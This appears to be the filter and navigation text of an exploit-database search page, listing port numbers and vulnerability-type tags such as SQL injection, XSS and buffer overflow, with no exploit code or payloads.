9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


